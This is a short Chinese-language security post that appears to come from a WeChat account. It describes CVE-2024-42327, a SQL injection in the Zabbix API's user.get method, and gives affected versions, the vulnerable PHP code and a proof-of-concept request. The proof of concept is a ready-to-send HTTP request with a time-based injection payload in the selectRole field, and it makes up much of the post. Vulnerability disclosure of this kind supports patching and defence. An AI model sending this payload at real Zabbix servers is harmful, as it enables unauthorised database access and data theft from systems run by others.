#  CVE-2024-42327 Zabbix SQL注入 POC   
原创 Khan安全团队  Khan安全攻防实验室   2024-12-06 11:50  
  
      Z  
abbix 前端上具有默认用户角色或任何其他授予 API 访问权限的角色的非管理员用户帐户均可利用此漏洞。  
addRelatedObjects 函数中的 CUser 类中存在 SQLi，此函数由 CUser.get 函数调用，每个具有 API 访问权限的用户均可使用该函数。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV2hgibGXicPPXMXYkBLK0PUdQ49O6QPnhg6eSCZ3KAnU0qmibTmRyEJIDn7yEmZtVTTVfjSIwefiabgrw/640?wx_fmt=png&from=appmsg "")  
  
  
受影响和修复的版本  
	  
：  
  
6.0.0 - 6.0.31 / 6.0.32rc1  
  
6.4.0 - 6.4.16 / 6.4.17rc1  
  
7.0.0 / 7.0.1rc1  
  
受影响代码：  
  
```
$db_roles = DBselect(
  'SELECT u.userid'.($options['selectRole'] ? ',r.'.implode(',r.', $options['selectRole']) : '').
  ' FROM users u,role r'.
  ' WHERE u.roleid=r.roleid'.
  ' AND '.dbConditionInt('u.userid', $userIds)
);
```  
  
  
  
POC  
：  
```
POST /api_jsonrpc.php HTTP/1.1
Host: localhost
User-Agent: curl/8.11.0
Accept: */*
Content-Type: application/json
Content-Length: 222
Connection: keep-alive

{
  "jsonrpc": "2.0",
  "method": "user.get",
  "params": {
    "selectRole": ["roleid", "name", "type", "readonly AND (SELECT(SLEEP(5)))"],
    "userids": ["1","2"]
  },
  "id": 1,
  "auth": ""
}
```  
  
  
  
  
